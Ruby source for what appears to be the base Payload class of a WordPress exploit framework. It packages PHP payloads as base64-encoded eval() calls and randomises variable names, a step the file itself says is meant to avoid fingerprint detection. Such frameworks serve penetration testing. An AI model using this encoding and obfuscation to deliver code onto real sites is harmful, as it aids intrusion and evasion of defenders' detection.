require 'base64'

module Wpxf
  # The base class for all payloads.
  class Payload
    include Wpxf::Options

    def initialize
      super

      register_options([
        BooleanOption.new(
          name: 'encode_payload',
          desc: 'Encode the payload to avoid fingerprint detection',
          required: true,
          default: true
        )
      ])
    end

    # @return an encoded version of the payload.
    def encoded
      compiled = raw_payload_with_random_var_names
      if normalized_option_value('encode_payload')
        "<?php eval(base64_decode('#{Base64.strict_encode64(compiled)}')); ?>"
      else
        "<?php #{compiled} ?>"
      end
    end

    # Helper method to escape single quotes in a string.
    # @param val [String] the string with quotes to escape.
    # @return [String] the string with quotes escaped.
    def escape_single_quotes(val)
      val.gsub(/'/) { "\\'" }
    end

    # Generate a random variable name.
    # @return [String] a random name beetween 1 and 9 alpha characters.
    def random_var_name
      Utility::Text.rand_alpha(rand(5..20))
    end

    # Generate a hash of variable names.
    # @param keys [Array] an array of keys.
    # @return [Hash] a hash containing a unique name for each key.
    def generate_vars(keys)
      vars = {}
      keys.each do |key|
        loop do
          var_name = random_var_name
          unless vars.value?(var_name)
            vars[key] = random_var_name
            break
          end
        end
      end
      vars
    end

    # Do any pre-exploit setup required by the payload.
    # @param mod [Module] the module using the payload.
    # @return [Boolean] true if successful.
    def prepare(mod)
      true if mod
    end

    # Run payload specific post-exploit procedures.
    # @param mod [Module] the module using the payload.
    # @return [Boolean] true if successful.
    def post_exploit(mod)
      true if mod
    end

    # Cleanup any allocated resource to the payload.
    def cleanup
    end

    # Run checks to raise warnings to the user of any issues or noteworthy
    # points in regards to the payload being used with the current module.
    # @param mod [Module] the module using the payload.
    def check(mod)
    end

    # @return [Hash] a hash of constants that should be injected at the
    #   beginning of the payload.
    def constants
      {}
    end

    # @return [Array] an array of variable names that should be obfuscated in
    #   the payload that is generated.
    def obfuscated_variables
      ['wpxf_disabled', 'wpxf_output', 'wpxf_exec', 'wpxf_cmd', 'wpxf_handle', 'wpxf_pipes', 'wpxf_fp']
    end

    # @return [String] the PHP preamble that should be included at the
    #   start of all payloads.
    def php_preamble
      preamble = DataFile.new('php', 'preamble.php').php_content
      constants.each do |k, v|
        preamble += "  $#{k} = " + (v.is_a?(String) ? "'#{escape_single_quotes(v)}'" : v.to_s) + ";\n"
      end
      preamble
    end

    # @return the payload in its raw format.
    attr_accessor :raw

    private

    def raw_payload_with_random_var_names
      payload = "#{php_preamble} #{raw}"
      vars = generate_vars(obfuscated_variables)
      obfuscated_variables.each { |v| payload.gsub!("$#{v}", "$#{vars[v]}") }
      payload
    end
  end
end
